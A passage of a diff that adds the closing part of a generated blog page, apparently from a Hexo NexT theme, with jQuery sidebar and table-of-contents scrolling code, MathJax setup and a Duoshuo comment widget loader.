+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
